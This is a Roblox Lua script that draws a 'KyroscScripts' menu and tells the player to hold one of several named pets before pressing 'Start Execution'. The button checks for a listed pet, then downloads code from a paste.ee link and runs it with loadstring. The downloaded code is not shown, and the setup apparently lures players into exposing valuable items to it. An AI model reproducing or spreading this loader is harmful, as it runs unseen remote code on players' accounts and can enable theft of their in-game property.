local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KyroscScriptsGUI"
screenGui.Parent = gui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 320, 0, 200)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "KyroscScripts (v3.2.1)"
title.Size = UDim2.new(1, 0, 0, 36)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = mainFrame

local petInstructions = Instance.new("TextLabel")
petInstructions.Name = "PetInstructions"
petInstructions.Text = "Hold one of these pets:\n- Red Fox - Dragonfly\n- Raccoon - Praying Mantis\n- Deer\nThen click to start."
petInstructions.Size = UDim2.new(0.9, 0, 0, 80)
petInstructions.Position = UDim2.new(0.05, 0, 0, 50)
petInstructions.BackgroundTransparency = 1
petInstructions.TextColor3 = Color3.fromRGB(200, 200, 200)
petInstructions.Font = Enum.Font.Gotham
petInstructions.TextSize = 14
petInstructions.TextXAlignment = Enum.TextXAlignment.Left
petInstructions.TextYAlignment = Enum.TextYAlignment.Top
petInstructions.Parent = mainFrame

local startButton = Instance.new("TextButton")
startButton.Name = "StartButton"
startButton.Text = "Start Execution"
startButton.Size = UDim2.new(0.9, 0, 0, 44)
startButton.Position = UDim2.new(0.05, 0, 0, 140)
startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
startButton.BorderSizePixel = 0
startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
startButton.Font = Enum.Font.GothamBold
startButton.TextSize = 16
startButton.AutoButtonColor = false
startButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = startButton

startButton.MouseEnter:Connect(function()
    startButton.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
end)
startButton.MouseLeave:Connect(function()
    startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
end)

local footer = Instance.new("TextLabel")
footer.Name = "Footer"
footer.Text = "KyroscScripts | discord.gg/SqqvAH7nXf"
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -24)
footer.BackgroundTransparency = 1
footer.TextColor3 = Color3.fromRGB(150, 150, 150)
footer.Font = Enum.Font.Gotham
footer.TextSize = 12
footer.Parent = mainFrame

local function showNotification(message, color)
    local oldNotif = mainFrame:FindFirstChild("Notification")
    if oldNotif then oldNotif:Destroy() end
    
    local notification = Instance.new("TextLabel")
    notification.Name = "Notification"
    notification.Text = message
    notification.Size = UDim2.new(0.85, 0, 0, 36)
    notification.Position = UDim2.new(0.5, 0, 0, -46)
    notification.AnchorPoint = Vector2.new(0.5, 0)
    notification.BackgroundColor3 = color
    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
    notification.Font = Enum.Font.GothamBold
    notification.TextSize = 15
    notification.TextWrapped = true
    notification.Parent = mainFrame
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 6)
    notifCorner.Parent = notification
    
    delay(3, function()
        if notification and notification.Parent then
            notification:Destroy()
        end
    end)
end

local function hasValidPet()
    local character = player.Character or player.CharacterAdded:Wait()
    local validPets = {
        ["Red Fox"] = true,
        ["Raccoon"] = true,
        ["Dragonfly"] = true,
        ["Praying Mantis"] = true,
        ["Deer"] = true,
    }
    
    local function checkTools(container)
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                print("Found Tool:", item.Name) -- Debug: cetak nama tool
                -- Pengecekan fleksibel: apakah nama tool mengandung nama valid pet
                for petName in pairs(validPets) do
                    if string.find(item.Name:lower(), petName:lower()) then
                        return true
                    end
                end
            end
        end
        return false
    end
    
    if checkTools(character) then
        return true
    end
    
    local backpack = player:FindFirstChild("Backpack")
    if backpack and checkTools(backpack) then
        return true
    end
    
    return false
end

local function executeExternalScript()
    showNotification("Checking for pets...", Color3.fromRGB(0, 100, 255))
    
    if not hasValidPet() then
        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
        return
    end
    
    showNotification("Executing script...", Color3.fromRGB(0, 150, 0))
    
    local success, err = pcall(function()
        local httpGet = game:HttpGet or game.HttpGet
        local scriptString = httpGet("https://paste.ee/r/s7TguhY5")
        assert(scriptString and #scriptString > 0, "Failed to fetch script")
        loadstring(scriptString)()
    end)
    
    if success then
        showNotification("Script executed!", Color3.fromRGB(0, 200, 0))
    else
        showNotification("Error: "..tostring(err), Color3.fromRGB(255, 50, 50))
        warn("Execution error: "..tostring(err))
    end
end

startButton.MouseButton1Click:Connect(executeExternalScript)
